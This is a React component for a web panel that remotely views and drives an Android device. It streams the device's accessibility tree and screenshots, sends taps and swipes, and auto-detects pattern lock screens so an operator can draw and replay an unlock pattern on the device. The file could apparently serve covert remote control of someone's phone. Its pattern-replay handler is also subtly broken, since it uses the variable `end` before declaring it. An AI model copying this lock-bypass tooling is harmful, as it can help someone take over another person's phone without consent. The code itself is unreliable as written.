import { Component, useEffect, useLayoutEffect, useRef, useState, useCallback, useMemo } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import Background from '../components/Background';
import Toast from '../components/Toast';
import { getDevice, setNodesStream, getNodes, sendCommand, getSession } from '../lib/store';


// Lock-screen pattern dot positions (matches Device.jsx DOT_POS calibration)
const LOCK_DOT_POS = [
  [0.22,0.50],[0.50,0.50],[0.78,0.50],
  [0.22,0.63],[0.50,0.63],[0.78,0.63],
  [0.22,0.76],[0.50,0.76],[0.78,0.76],
];
const FILTERS = [
  { id: 'tap',   label: 'Tappable' },
  { id: 'input', label: 'Inputs'   },
  { id: 'lock',  label: 'Lock Dots'},
  { id: 'all',   label: 'All'      },
];

export default function Reader() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [tree, setTree] = useState(null);
  const [showOverlay, setShowOverlay] = useState(true);
  const [showLabels, setShowLabels] = useState(false);
  const [showScreen, setShowScreen] = useState(true);
  const [filter, setFilter] = useState('tap');
  const [forcePatternMode, setForcePatternMode] = useState(false);
  const [hoverIdx, setHoverIdx] = useState(-1);
  const [tappedIdx, setTappedIdx] = useState(-1);
  const [toast, setToast] = useState({ show: false, msg: '', type: 'success' });
  const [shotUrl, setShotUrl] = useState(null);
  const aliveRef = useRef(true);

  const fetchDetail = useCallback(async () => {
    try { const d = await getDevice(id); if (aliveRef.current) setDevice(d); }
    catch (e) { if (e.status === 401) navigate('/'); else if (e.status === 404) navigate('/dashboard'); }
  }, [id, navigate]);

  const fetchTree = useCallback(async () => {
    try { const r = await getNodes(id); if (aliveRef.current && r.tree) setTree(r.tree); }
    catch {}
  }, [id]);

  // Fetch screenshot for background
  const fetchShot = useCallback(async () => {
    if (!showScreen) return;
    try {
      const r = await fetch('/api/devices/' + encodeURIComponent(id) + '/screenshot', {
        headers: { Authorization: 'Bearer ' + getSession() }
      });
      if (!r.ok || !aliveRef.current) return;
      const blob = await r.blob();
      const url = URL.createObjectURL(blob);
      setShotUrl(prev => { if (prev) URL.revokeObjectURL(prev); return url; });
    } catch {}
  }, [id, showScreen]);

  useEffect(() => {
    aliveRef.current = true;
    setNodesStream(id, true).catch(() => {});
    fetchDetail(); fetchTree(); fetchShot();
    const t1 = setInterval(fetchDetail, 4000);
    const t2 = setInterval(fetchTree, 700);
    const t3 = setInterval(fetchShot, 1000);
    return () => {
      aliveRef.current = false;
      clearInterval(t1); clearInterval(t2); clearInterval(t3);
      setNodesStream(id, false).catch(() => {});
    };
  }, [id, fetchDetail, fetchTree, fetchShot]);

  const flash = (msg, type = 'success') => {
    setToast({ show: true, msg, type });
    setTimeout(() => setToast(t => ({ ...t, show: false })), 900);
  };
  const navAct = (type, label) => sendCommand(id, type).then(() => flash(label)).catch(() => {});

  const sw = tree?.screenW || device?.screenW || 1080;
  const sh = tree?.screenH || device?.screenH || 2400;

  // Auto-detect: is the device currently on a pattern lock screen?
  // Looks for class names like PatternView, KeyguardPatternView, LockPatternView.
  // NOTE: many OEM keyguards (esp. ColorOS) don't expose nodes to a11y at all,
  // so this auto-detect can return false even on a real lock screen — hence the
  // manual `forcePatternMode` toggle below.
  const autoDetectedPattern = useMemo(() => {
    if (!tree?.nodes) return false;
    return tree.nodes.some(n => {
      const cls = (n.c || '').toLowerCase();
      return cls.includes('pattern') || cls.includes('keyguard') || cls.includes('lockview');
    });
  }, [tree]);
  const isPatternLock = forcePatternMode || autoDetectedPattern;
  const ageMs = tree ? (Date.now() - tree.ts) : Infinity;
  const fresh = ageMs < 3000;

  // Auto-switch to lock filter the FIRST time pattern lock is auto-detected
  const autoSwitchedRef = useRef(false);
  useEffect(() => {
    if (autoDetectedPattern && !autoSwitchedRef.current) {
      autoSwitchedRef.current = true;
      setFilter('lock');
    }
    if (!autoDetectedPattern) autoSwitchedRef.current = false;
  }, [autoDetectedPattern]);

  const nodes = useMemo(() => {
    if (!tree?.nodes) return [];
    const total = sw * sh;
    const out = [];
    tree.nodes.forEach((n, i) => {
      const [l, t, r, b] = n.b || [0, 0, 0, 0];
      const w = r - l, h = b - t;
      if (w < 8 || h < 8) return;
      const area = w * h;
      if (area > total * 0.85) return;
      const isClickable = (n.k & 1) !== 0;
      const isInput     = (n.k & 2) !== 0;
      const isFocused   = (n.k & 8) !== 0;
      if (filter === 'tap'   && !isClickable && !isInput) return;
      if (filter === 'input' && !isInput) return;
      // Lock dots: small-ish clickable nodes roughly circular (w≈h) in center area
      if (filter === 'lock') {
        const cx = (l + r) / 2, cy = (t + b) / 2;
        const isCircular = Math.abs(w - h) < Math.max(w, h) * 0.6;
        const inCenter = cx > sw * 0.1 && cx < sw * 0.9 && cy > sh * 0.2 && cy < sh * 0.85;
        const smallEnough = w < sw * 0.35 && h < sh * 0.25;
        if (!isClickable || !isCircular || !inCenter || !smallEnough) return;
      }
      out.push({ i, l, t, r, b, w, h, area, isClickable, isInput, isFocused, text: n.t || '' });
    });
    out.sort((a, b) => b.area - a.area);
    return out;
  }, [tree, sw, sh, filter]);

  const tapNode = (n, ev) => {
    ev?.stopPropagation?.();
    ev?.preventDefault?.();
    const cx = Math.round(n.l + n.w / 2);
    const cy = Math.round(n.t + n.h / 2);
    setTappedIdx(n.i);
    setTimeout(() => setTappedIdx(-1), 350);
    sendCommand(id, 'tap', { x: cx, y: cy })
      .then(() => flash(n.text ? n.text.slice(0, 22) : `tap ${cx},${cy}`))
      .catch(() => flash('tap failed', 'error'));
  };

  const colorFor = (n) => {
    if (n.isFocused) return { stroke: '#fbbf24', fill: 'rgba(251,191,36,0.20)' };
    if (n.isInput)   return { stroke: '#38bdf8', fill: 'rgba(56,189,248,0.18)' };
    if (filter === 'lock' && n.isClickable) return { stroke: '#a78bfa', fill: 'rgba(167,139,250,0.25)' };
    if (n.isClickable) return { stroke: '#34d399', fill: 'rgba(52,211,153,0.07)' };
    return { stroke: '#94a3b8', fill: 'rgba(148,163,184,0.04)' };
  };

  return (
    <div className="fixed inset-0 flex flex-col overflow-hidden bg-bg" style={{ overscrollBehavior: 'none', touchAction: 'pan-x' }}>
      <Background />

      {/* Header */}
      <header className="relative z-20 flex items-center justify-between gap-2 px-3 py-2.5 border-b border-white/[0.06] bg-bg/80 backdrop-blur-xl">
        <button onClick={() => navigate('/device/' + encodeURIComponent(id))} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 hover:bg-white/10 active:scale-95 transition-all flex-shrink-0">
          <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2.2"><path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </button>
        <div className="flex-1 min-w-0 text-center">
          <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35 leading-none">Wireframe Reader</div>
          <div className="text-[12.5px] font-bold text-white/95 leading-tight mt-0.5 truncate">{device?.brand || '—'} {device?.model || ''}</div>
        </div>
        <div className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-full border text-[9.5px] font-bold tracking-wide uppercase flex-shrink-0 ${fresh ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300' : 'bg-white/[0.04] border-white/[0.08] text-white/45'}`}>
          <span className={`w-1.5 h-1.5 rounded-full ${fresh ? 'bg-emerald-400 animate-pulse-soft' : 'bg-white/30'}`} />
          {fresh ? `${nodes.length}` : '—'}
        </div>
      </header>

      {/* Toolbar */}
      <div className="relative z-10 flex items-center gap-1.5 px-3 py-2 border-b border-white/[0.04] bg-bg/40 overflow-x-auto no-scrollbar">
        <ToggleChip active={showScreen} onClick={() => setShowScreen(v => !v)}>
          {showScreen ? '📱 Screen' : '📱 Screen'}
        </ToggleChip>
        <ToggleChip active={showOverlay} onClick={() => setShowOverlay(v => !v)}>
          Overlay
        </ToggleChip>
        <ToggleChip active={showLabels} onClick={() => setShowLabels(v => !v)}>
          Labels
        </ToggleChip>
        <div className="w-px h-5 bg-white/10 mx-1 flex-shrink-0" />
        <div className="flex items-center gap-1 flex-shrink-0">
          {FILTERS.map(f => (
            <button key={f.id} onClick={() => setFilter(f.id)}
              className={`px-2.5 py-1.5 rounded-lg border text-[10px] font-bold tracking-[1.2px] uppercase transition-all active:scale-95 ${filter === f.id ? 'bg-emerald-500/15 border-emerald-500/30 text-emerald-300' : 'bg-white/[0.04] border-white/[0.08] text-white/55 hover:bg-white/[0.08] hover:text-white/85'}`}>
              {f.label}
            </button>
          ))}
          <button onClick={() => { setForcePatternMode(v => !v); if (!forcePatternMode) setFilter('lock'); }}
            title="Force pattern drawing mode (use when Reader can't auto-detect lock screen)"
            className={`px-2.5 py-1.5 rounded-lg border text-[10px] font-bold tracking-[1.2px] uppercase transition-all active:scale-95 ${forcePatternMode ? 'bg-purple-500/20 border-purple-500/50 text-purple-200 shadow-[0_0_12px_rgba(167,139,250,0.4)]' : 'bg-white/[0.04] border-white/[0.08] text-white/55 hover:bg-white/[0.08] hover:text-white/85'}`}>
            {forcePatternMode ? '🔷 Pattern ON' : '🔷 Pattern'}
          </button>
        </div>
        <div className="flex-1" />
        <div className="text-[9.5px] font-bold tracking-wide uppercase text-white/40 flex-shrink-0">{sw}×{sh}</div>
      </div>

      {/* Stage */}
      <main className="relative z-10 flex-1 min-h-0 overflow-hidden p-2" style={{ touchAction: 'none', overscrollBehavior: 'contain' }}>
        <div className="relative w-full h-full border border-white/[0.06] rounded-xl overflow-hidden shadow-[0_30px_80px_-30px_rgba(0,0,0,0.8)]"
          style={{ background: showScreen && shotUrl ? 'transparent' : 'rgba(0,0,0,0.70)' }}>
          <StageBoundary>
            <Stage
              id={id}
              sw={sw} sh={sh}
              nodes={showOverlay ? nodes : []}
              showLabels={showLabels}
              hoverIdx={hoverIdx}
              tappedIdx={tappedIdx}
              colorFor={colorFor}
              onTapNode={tapNode}
              onHover={setHoverIdx}
              shotUrl={showScreen ? shotUrl : null}
              flash={flash}
              filter={filter}
              isPatternLock={isPatternLock}
              forcePatternMode={forcePatternMode}
              autoDetectedPattern={autoDetectedPattern}
            />
          </StageBoundary>
          {!showOverlay && !shotUrl && (
            <div className="absolute inset-0 flex items-center justify-center text-white/35 text-[11px] font-bold tracking-[1.6px] uppercase pointer-events-none">
              Overlay & screen hidden
            </div>
          )}
          {showOverlay && nodes.length === 0 && (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 text-white/40 pointer-events-none">
              <div className="w-1.5 h-1.5 rounded-full bg-emerald-400/70 animate-pulse-soft" />
              <div className="text-[10.5px] font-bold tracking-[1.6px] uppercase">
                {fresh ? 'No tappable nodes' : 'Waiting for screen data…'}
              </div>
            </div>
          )}
        </div>
      </main>

      {/* Bottom stats */}
      <div className="relative z-10 grid grid-cols-4 gap-1.5 px-3 py-2 border-t border-white/[0.06] bg-bg/80 backdrop-blur-xl">
        <Stat label="Shown" value={nodes.length} />
        <Stat label="Total" value={tree?.nodes?.length || 0} />
        <Stat label="Inputs" value={tree?.nodes?.filter(n => (n.k & 2)).length || 0} />
        <Stat label="Age" value={fresh ? `${Math.floor(ageMs/100)*100}ms` : '—'} />
      </div>

      {/* Bottom nav */}
      <footer className="relative z-20 border-t border-white/[0.06] bg-bg/80 backdrop-blur-xl px-2 py-2 pb-[max(8px,env(safe-area-inset-bottom))]">
        <div className="grid grid-cols-3 gap-1.5">
          <Nav label="Back" onClick={() => navAct('back', 'BACK')} disabled={!device?.online}>
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><path d="M9 18l-6-6 6-6M3 12h18" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </Nav>
          <Nav label="Home" onClick={() => navAct('home', 'HOME')} disabled={!device?.online}>
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><path d="M3 11l9-8 9 8M5 10v10h14V10" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </Nav>
          <Nav label="Recents" onClick={() => navAct('recents', 'RECENTS')} disabled={!device?.online}>
            <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><rect x="5" y="5" width="14" height="14" rx="1.5"/></svg>
          </Nav>
        </div>
      </footer>

      <Toast show={toast.show} message={toast.msg} type={toast.type} />
    </div>
  );
}

function ToggleChip({ children, active, onClick }) {
  return (
    <button onClick={onClick} className={`px-2.5 py-1.5 rounded-lg border text-[10px] font-bold tracking-[1.2px] uppercase transition-all active:scale-95 flex-shrink-0 ${active ? 'bg-emerald-500/15 border-emerald-500/30 text-emerald-300' : 'bg-white/[0.04] border-white/[0.08] text-white/55 hover:bg-white/[0.08] hover:text-white/85'}`}>
      {children}
    </button>
  );
}
function Stat({ label, value }) {
  return (
    <div className="flex flex-col items-center justify-center py-1 rounded-lg bg-white/[0.03] border border-white/[0.05]">
      <div className="text-[8.5px] font-bold tracking-[1.2px] uppercase text-white/40">{label}</div>
      <div className="text-[12px] font-bold text-white/95 tabular-nums mt-0.5">{value}</div>
    </div>
  );
}
function Nav({ children, label, onClick, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled} className="flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-white/[0.05] border border-white/[0.08] text-white/85 hover:bg-white/10 hover:text-white active:scale-95 transition-all disabled:opacity-30 disabled:cursor-not-allowed">
      {children}
      <span className="text-[10px] font-bold tracking-[1.2px] uppercase">{label}</span>
    </button>
  );
}

class StageBoundary extends Component {
  constructor(p) { super(p); this.state = { err: null }; }
  static getDerivedStateFromError(err) { return { err }; }
  componentDidCatch(err) { try { console.error('Stage error:', err); } catch {} }
  componentDidUpdate(prev) { if (this.state.err && prev.children !== this.props.children) this.setState({ err: null }); }
  render() {
    if (this.state.err) {
      return (
        <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 text-rose-300/80 px-6 text-center">
          <div className="text-[10px] font-bold tracking-[1.6px] uppercase opacity-70">Overlay Error</div>
          <button onClick={() => this.setState({ err: null })} className="mt-2 px-3 py-1.5 text-[10px] font-bold tracking-[1.2px] uppercase rounded-lg bg-white/[0.06] border border-white/[0.1] text-white/80 hover:bg-white/[0.12] active:scale-95">Retry</button>
        </div>
      );
    }
    return this.props.children;
  }
}

function Stage({ id, sw, sh, nodes, showLabels, hoverIdx, tappedIdx, colorFor, onTapNode, onHover, shotUrl, flash, filter, isPatternLock, forcePatternMode, autoDetectedPattern }) {
  const wrapRef = useRef(null);
  const innerRef = useRef(null);
  const [dim, setDim] = useState({ w: 0, h: 0, ready: false });
  const dragRef = useRef(null);

  useEffect(() => {
    const el = wrapRef.current;
    if (!el) return;
    let raf = 0, cancelled = false;
    const measure = () => {
      if (cancelled) return;
      cancelAnimationFrame(raf);
      raf = requestAnimationFrame(() => {
        try {
          const r = el.getBoundingClientRect();
          if (!r.width || !r.height) return;
          const wrapAspect = r.width / r.height;
          const screenAspect = (sw > 0 && sh > 0) ? (sw / sh) : 0.45;
          let w, h;
          if (wrapAspect > screenAspect) { h = r.height; w = h * screenAspect; }
          else { w = r.width; h = w / screenAspect; }
          setDim({ w: Math.max(1, Math.floor(w)), h: Math.max(1, Math.floor(h)), ready: true });
        } catch {}
      });
    };
    measure();
    let ro = null;
    try { if (typeof ResizeObserver !== 'undefined') { ro = new ResizeObserver(measure); ro.observe(el); } } catch {}
    window.addEventListener('resize', measure);
    window.addEventListener('orientationchange', measure);
    return () => {
      cancelled = true;
      cancelAnimationFrame(raf);
      try { ro && ro.disconnect(); } catch {}
      window.removeEventListener('resize', measure);
      window.removeEventListener('orientationchange', measure);
    };
  }, [sw, sh]);

  // Convert pointer event to device coordinates (sw x sh)
  const toDeviceCoords = (e) => {
    const inner = innerRef.current;
    if (!inner) return null;
    const r = inner.getBoundingClientRect();
    const xN = Math.max(0, Math.min(1, (e.clientX - r.left) / r.width));
    const yN = Math.max(0, Math.min(1, (e.clientY - r.top) / r.height));
    return { x: Math.round(xN * sw), y: Math.round(yN * sh), xN, yN };
  };

  // Find which node (if any) the device-coord point falls inside
  const hitNode = (devX, devY) => {
    for (const n of nodes) {
      if (devX >= n.l && devX <= n.r && devY >= n.t && devY <= n.b) return n;
    }
    return null;
  };

  // Pattern drawing state — universal mode (works on every OEM).
  // We capture the raw pointer path (in device pixels) and replay it as a
  // multi-point gesture. No hardcoded dot positions = no device mismatch.
  const patternPathRef = useRef([]);             // [{x, y, xN, yN}]  device-pixel + normalised
  const prevPatternPosRef = useRef(null);
  const [patternPath, setPatternPath] = useState([]);
  const [patternActivePos, setPatternActivePos] = useState(null);

  // Append a point to the pattern path (in both device-pixel & normalised coords)
  const addPatternPoint = (p) => {
    patternPathRef.current.push({ x: p.x, y: p.y, xN: p.xN, yN: p.yN });
  };

  const sendPatternGesture = () => {
    const path = patternPathRef.current;
    if (path.length < 2) return;
    // Down-sample if super dense (gesture API caps around ~100 strokes well)
    let pts = path;
    if (pts.length > 60) {
      const step = pts.length / 60;
      const sampled = [];
      for (let i = 0; i < pts.length; i += step) sampled.push(pts[Math.floor(i)]);
      sampled.push(pts[pts.length - 1]);
      pts = sampled;
    }
    const points = pts.map(p => [Math.round(p.x), Math.round(p.y)]);
    // Duration: scale with length so touch feels deliberate (Android needs >= ~250ms for pattern)
    const dur = Math.max(600, Math.min(2500, points.length * 30));
    sendCommand(id, 'gesture', { points, dur })
      .then(() => flash && flash(`pattern path (${points.length} pts)`))
      .catch(() => flash && flash('pattern failed', 'error'));
  };

  const onDown = (e) => {
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch {}
    const p = toDeviceCoords(e);
    if (!p) return;
    if (isPatternLock) {
      // Start fresh pattern path
      patternPathRef.current = [];
      addPatternPoint(p);
      prevPatternPosRef.current = p;
      setPatternPath([...patternPathRef.current]);
      setPatternActivePos({ xN: p.xN, yN: p.yN });
    }
    dragRef.current = { ...p, t: Date.now() };
  };

  const onMove = (e) => {
    if (!dragRef.current) return;
    if (!isPatternLock) return;
    const p = toDeviceCoords(e);
    if (!p) return;
    setPatternActivePos({ xN: p.xN, yN: p.yN });
    // Append point only if it has moved enough (avoid duplicate-point spam,
    // but keep enough density for smooth replay on the device).
    const prev = prevPatternPosRef.current || p;
    const dxN = p.xN - prev.xN, dyN = p.yN - prev.yN;
    const dist = Math.hypot(dxN, dyN);
    if (dist >= 0.012) {  // ~1.2% of width / height
      addPatternPoint(p);
      prevPatternPosRef.current = p;
      setPatternPath([...patternPathRef.current]);
    }
  };

  const onUp = (e) => {
    const start = dragRef.current; dragRef.current = null;
    if (!start) return;

    // Pattern lock mode: replay raw drawn path on device
    if (isPatternLock && patternPathRef.current.length >= 2) {
      // Make sure the final point is recorded
      addPatternPoint(end);
      sendPatternGesture();
      patternPathRef.current = [];
      prevPatternPosRef.current = null;
      setPatternPath([]);
      setPatternActivePos(null);
      return;
    }
    if (isPatternLock) {
      patternPathRef.current = [];
      prevPatternPosRef.current = null;
      setPatternPath([]);
      setPatternActivePos(null);
    }

    const end = toDeviceCoords(e);
    if (!end) return;
    const dist = Math.hypot(end.x - start.x, end.y - start.y);
    const dt = Date.now() - start.t;

    const swipeThresh = Math.max(40, 0.06 * Math.hypot(sw, sh));
    if (dist > swipeThresh) {
      const dur = Math.max(120, Math.min(700, dt));
      sendCommand(id, 'swipe', { x1: start.x, y1: start.y, x2: end.x, y2: end.y, dur })
        .then(() => flash && flash(`swipe ${Math.round(dist)}px`))
        .catch(() => flash && flash('swipe failed', 'error'));
      return;
    }
    const n = hitNode(end.x, end.y);
    if (n) onTapNode(n, e);
    else {
      sendCommand(id, 'tap', { x: end.x, y: end.y })
        .then(() => flash && flash(`tap ${end.x},${end.y}`))
        .catch(() => flash && flash('tap failed', 'error'));
    }
  };

  const onCancel = () => {
    dragRef.current = null;
    patternPathRef.current = [];
    prevPatternPosRef.current = null;
    setPatternPath([]);
    setPatternActivePos(null);
  };

  return (
    <div ref={wrapRef} className="absolute inset-0 flex items-center justify-center" style={{ touchAction: 'none', WebkitUserSelect: 'none', userSelect: 'none' }}>
      <div ref={innerRef} className="relative rounded-2xl overflow-hidden"
        onPointerDown={onDown}
        onPointerMove={onMove}
        onPointerUp={onUp}
        onPointerCancel={onCancel}
        onPointerLeave={onCancel}
        style={{
          width: dim.ready ? dim.w + 'px' : '100%',
          height: dim.ready ? dim.h + 'px' : '100%',
          background: shotUrl ? 'black' : 'rgba(8,10,14,0.55)',
          border: '1px solid rgba(255,255,255,0.05)',
          visibility: dim.ready ? 'visible' : 'hidden',
          touchAction: 'none',
          cursor: 'crosshair',
        }}>
        {shotUrl && (
          <img src={shotUrl} alt="screen" draggable="false" className="absolute inset-0 w-full h-full object-cover pointer-events-none" style={{ zIndex: 0 }} />
        )}
        {shotUrl && nodes.length > 0 && (
          <div className="absolute inset-0 pointer-events-none" style={{ background: 'rgba(0,0,0,0.18)', zIndex: 1 }} />
        )}
        {/* Live pattern path while drawing — draws the actual finger trail */}
        {isPatternLock && patternPath.length > 0 && (
          <svg className="absolute inset-0 w-full h-full pointer-events-none" style={{ zIndex: 6 }} viewBox="0 0 100 100" preserveAspectRatio="none">
            <polyline
              points={patternPath.map(pt => `${pt.xN*100},${pt.yN*100}`).join(' ')}
              fill="none"
              stroke="#a78bfa"
              strokeWidth="0.9"
              strokeLinecap="round"
              strokeLinejoin="round"
              style={{ filter: 'drop-shadow(0 0 1px rgba(167,139,250,0.8))' }}
            />
            {patternActivePos && (
              <circle cx={patternActivePos.xN*100} cy={patternActivePos.yN*100} r="1.2"
                fill="#c4b5fd" stroke="#a78bfa" strokeWidth="0.4"
                style={{ filter: 'drop-shadow(0 0 2px rgba(167,139,250,0.9))' }} />
            )}
          </svg>
        )}
        {/* Fixed 9-dot lock pattern grid — visible regardless of accessibility tree */}
        {filter === 'lock' && !forcePatternMode && !autoDetectedPattern && LOCK_DOT_POS.map(([px,py], i) => {
          const active = false;  // active highlight not used in raw-path mode
          return (
            <div key={'ldot'+i} className="pointer-events-none" style={{
              position: 'absolute', zIndex: 5,
              left: (px * 100) + '%', top: (py * 100) + '%',
              transform: 'translate(-50%,-50%)',
            }}>
              <div style={{
                width: active ? 32 : 28, height: active ? 32 : 28, borderRadius: '50%',
                border: active ? '2px solid rgba(167,139,250,1)' : '1.5px solid rgba(167,139,250,0.6)',
                position: 'absolute', top: '50%', left: '50%',
                transform: 'translate(-50%,-50%)',
                transition: 'all 0.1s',
              }} />
              <div style={{
                width: active ? 14 : 10, height: active ? 14 : 10, borderRadius: '50%',
                background: active ? 'rgba(167,139,250,1)' : 'rgba(167,139,250,0.9)',
                boxShadow: active ? '0 0 16px 5px rgba(167,139,250,0.8)' : '0 0 10px 3px rgba(167,139,250,0.5)',
                position: 'absolute', top: '50%', left: '50%',
                transform: 'translate(-50%,-50%)',
                transition: 'all 0.1s',
              }} />
              <div style={{
                position: 'absolute', top: '50%', left: '50%',
                transform: 'translate(-50%,-50%)',
                fontSize: 7, fontWeight: 'bold', color: 'white',
                zIndex: 1,
              }}>{i+1}</div>
            </div>
          );
        })}
        {/* Node-based overlay still shown for tap/input/all filters */}
        {filter === 'lock' && nodes.map(n => {
          const cx = ((n.l + n.r) / 2 / sw * 100);
          const cy = ((n.t + n.b) / 2 / sh * 100);
          return (
            <div key={'dot'+n.i} className="pointer-events-none" style={{
              position: 'absolute', zIndex: 4,
              left: cx + '%', top: cy + '%',
              transform: 'translate(-50%,-50%)',
              width: 8, height: 8, borderRadius: '50%',
              background: 'rgba(251,191,36,0.7)',
            }} />
          );
        })}
        {nodes.map(n => {
          const c = colorFor(n);
          const isHover = hoverIdx === n.i;
          const isTap   = tappedIdx === n.i;
          return (
            <div key={n.i}
              onPointerEnter={() => onHover(n.i)}
              onPointerLeave={() => onHover(idx => idx === n.i ? -1 : idx)}
              style={{
                position: 'absolute', zIndex: 2,
                left: (n.l/sw*100)+'%', top: (n.t/sh*100)+'%',
                width: (n.w/sw*100)+'%', height: (n.h/sh*100)+'%',
                background: c.fill,
                border: `${(isHover||isTap)?2.5:(n.isFocused||n.isInput)?2:1.4}px solid ${c.stroke}`,
                borderRadius: 6,
                opacity: isTap?1:isHover?0.96:(n.isFocused||n.isInput)?0.95:shotUrl?0.78:0.6,
                boxShadow: isTap?`0 0 0 4px ${c.stroke}55`:'none',
                pointerEvents: 'none',
                transition: 'opacity 120ms, border-width 120ms, box-shadow 200ms',
              }}
            />
          );
        })}
        {/* Labels: ALWAYS inside the node at top-left, never overflow */}
        {(showLabels || hoverIdx >= 0) && nodes.map(n => {
          const visible = showLabels || hoverIdx === n.i;
          if (!visible || !n.text) return null;
          const isHover = hoverIdx === n.i;
          const borderClr = isHover ? '#fbbf24' : (n.isInput ? '#38bdf8' : n.isClickable ? '#34d399' : 'rgba(255,255,255,0.30)');
          return (
            <div key={'l'+n.i} className="text-[9.5px] font-bold leading-tight bg-black/85 text-white border rounded shadow whitespace-nowrap overflow-hidden text-ellipsis"
              style={{
                position: 'absolute', zIndex: 3,
                left: `calc(${(n.l/sw*100)}% + 2px)`,
                top:  `calc(${(n.t/sh*100)}% + 2px)`,
                maxWidth: `calc(${n.w/sw*100}% - 4px)`,
                padding: '1px 4px',
                borderColor: borderClr,
                textShadow: '0 1px 2px rgba(0,0,0,0.85)',
                pointerEvents: 'none',
              }}>
              {n.text.slice(0, 60)}
            </div>
          );
        })}
      </div>
    </div>
  );
}